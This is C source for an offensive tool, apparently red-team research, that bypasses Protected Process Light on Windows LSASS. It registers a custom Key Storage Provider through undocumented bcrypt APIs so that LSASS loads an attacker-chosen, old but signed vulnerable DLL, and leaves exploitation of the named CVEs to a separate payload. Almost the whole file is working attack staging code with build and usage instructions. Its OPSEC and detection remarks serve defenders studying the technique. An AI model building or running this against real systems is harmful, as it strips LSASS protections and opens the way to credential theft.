/*
 * ppl_byovdll.c - "Ghost in the PPL" / BYOVDLL primitive enabler (itm4n research).
 *
 * Bypasses PPL on LSASS without a vulnerable kernel driver by loading a legitimately
 * Microsoft-SIGNED but OLD/VULNERABLE DLL into the PPL process. PPL only checks that a
 * loaded DLL is Microsoft-signed; it does not enforce that the DLL is the *current*
 * version, so a vulnerable predecessor (still catalog-signed) loads and its exploitable
 * code path runs inside the PPL context.
 *
 * Target DLLs (CNG Key Isolation path):
 *   keyiso.dll      - CVE-2023-28229 (UAF in KeyIso) / CVE-2023-36906 (OOB read)
 *   ncryptprov.dll  - Microsoft Software KSP; loadable WITHOUT reboot by registering a
 *                     custom Key Storage Provider via BCryptRegisterProvider (undocumented).
 *
 * This program performs the *staging* half (the part that is reusable & non-destructive):
 *   1. Register a custom KSP name that points at an attacker-chosen provider DLL path.
 *   2. Open an algorithm/key with that provider -> LSASS (lsass via keyiso/CNG) loads the
 *      specified DLL inside its PPL context.
 *   3. (Exploit of the CVE inside that DLL is performed by a separate payload DLL.)
 *
 * BUILD (MSVC x64):  cl /O2 /W3 ppl_byovdll.c ncrypt.lib bcrypt.lib advapi32.lib
 * USAGE:  ppl_byovdll.exe register C:\\path\\to\\vuln_ncryptprov.dll  MyProv
 *         ppl_byovdll.exe trigger  MyProv
 *         ppl_byovdll.exe unregister MyProv
 *
 * Requires SeTcbPrivilege-adjacent rights to register a KSP (admin). AUTHORIZED USE ONLY.
 * OPSEC: registers under HKLM\...\Cryptography\Providers; LSASS ImageLoad of an old
 * keyiso/ncryptprov version is a strong IOC (Sysmon EID 7 + version mismatch).
 * See references/ppl-protected-process.md.
 */
#include <windows.h>
#include <bcrypt.h>
#include <ncrypt.h>
#include <stdio.h>

/* Undocumented provider-registration APIs from bcrypt_provider.h */
typedef struct _CRYPT_INTERFACE_REG {
    ULONG dwInterface; ULONG dwFlags; ULONG cFunctions; PWSTR *rgpszFunctions;
} CRYPT_INTERFACE_REG, *PCRYPT_INTERFACE_REG;
typedef struct _CRYPT_IMAGE_REG {
    PWSTR pszImage; ULONG cInterfaces; PCRYPT_INTERFACE_REG *rgpInterfaces;
} CRYPT_IMAGE_REG, *PCRYPT_IMAGE_REG;
typedef struct _CRYPT_PROVIDER_REG {
    ULONG cAliases; PWSTR *rgpszAliases; PCRYPT_IMAGE_REG pUM; PCRYPT_IMAGE_REG pKM;
} CRYPT_PROVIDER_REG, *PCRYPT_PROVIDER_REG;

typedef NTSTATUS (WINAPI *PBCryptRegisterProvider)(LPCWSTR, ULONG, PCRYPT_PROVIDER_REG);
typedef NTSTATUS (WINAPI *PBCryptUnregisterProvider)(LPCWSTR);
typedef NTSTATUS (WINAPI *PBCryptAddContextFunctionProvider)(ULONG, LPCWSTR, ULONG, LPCWSTR, LPCWSTR, ULONG);

#define BCRYPT_KEY_STORAGE_INTERFACE 0x00010005
#define CRYPT_LOCAL                  0x00000001
#define NCRYPT_KEY_STORAGE_INTERFACE_FN L"GetKeyStorageInterface"

static PBCryptRegisterProvider              pReg;
static PBCryptUnregisterProvider            pUnreg;
static PBCryptAddContextFunctionProvider    pAddCtx;

static int resolve(void) {
    HMODULE h = LoadLibraryA("bcrypt.dll");
    pReg    = (PBCryptRegisterProvider)GetProcAddress(h, "BCryptRegisterProvider");
    pUnreg  = (PBCryptUnregisterProvider)GetProcAddress(h, "BCryptUnregisterProvider");
    pAddCtx = (PBCryptAddContextFunctionProvider)GetProcAddress(h, "BCryptAddContextFunctionProvider");
    return (pReg && pUnreg && pAddCtx) ? 0 : 1;
}

static int do_register(const wchar_t *dll, const wchar_t *prov) {
    PWSTR fn[] = { (PWSTR)NCRYPT_KEY_STORAGE_INTERFACE_FN };
    CRYPT_INTERFACE_REG ireg = { BCRYPT_KEY_STORAGE_INTERFACE, CRYPT_LOCAL, 1, fn };
    PCRYPT_INTERFACE_REG pireg = &ireg;
    CRYPT_IMAGE_REG ureg = { (PWSTR)dll, 1, &pireg };
    CRYPT_PROVIDER_REG preg = { 0, NULL, &ureg, NULL };

    NTSTATUS s = pReg(prov, 0, &preg);
    if (s != 0) { wprintf(L"[-] BCryptRegisterProvider 0x%08lx\n", s); return 1; }
    s = pAddCtx(CRYPT_LOCAL, L"Default", BCRYPT_KEY_STORAGE_INTERFACE, NULL, prov, 0 /*append*/);
    wprintf(L"[+] registered KSP '%s' -> %s (AddContext 0x%08lx)\n", prov, dll, s);
    return 0;
}

static int do_trigger(const wchar_t *prov) {
    NCRYPT_PROV_HANDLE h = 0;
    SECURITY_STATUS s = NCryptOpenStorageProvider(&h, prov, 0);
    if (s != ERROR_SUCCESS) { wprintf(L"[-] NCryptOpenStorageProvider 0x%08lx\n", s); return 1; }
    wprintf(L"[+] provider opened; the configured DLL is now loaded by CNG/keyiso (lsass)\n");
    NCryptFreeObject(h);
    return 0;
}

static int do_unregister(const wchar_t *prov) {
    NTSTATUS s = pUnreg(prov);
    wprintf(L"[%c] BCryptUnregisterProvider 0x%08lx\n", s == 0 ? '+' : '-', s);
    return s == 0 ? 0 : 1;
}

int wmain(int argc, wchar_t **argv) {
    if (argc < 3) {
        wprintf(L"usage:\n");
        wprintf(L"  %s register   <vuln_dll_path> <ProvName>\n", argv[0]);
        wprintf(L"  %s trigger    <ProvName>\n", argv[0]);
        wprintf(L"  %s unregister <ProvName>\n", argv[0]);
        return 1;
    }
    if (resolve()) { wprintf(L"[-] could not resolve bcrypt provider APIs\n"); return 1; }

    if (!wcscmp(argv[1], L"register")   && argc >= 4) return do_register(argv[2], argv[3]);
    if (!wcscmp(argv[1], L"trigger")    && argc >= 3) return do_trigger(argv[2]);
    if (!wcscmp(argv[1], L"unregister") && argc >= 3) return do_unregister(argv[2]);
    wprintf(L"[-] bad arguments\n");
    return 1;
}
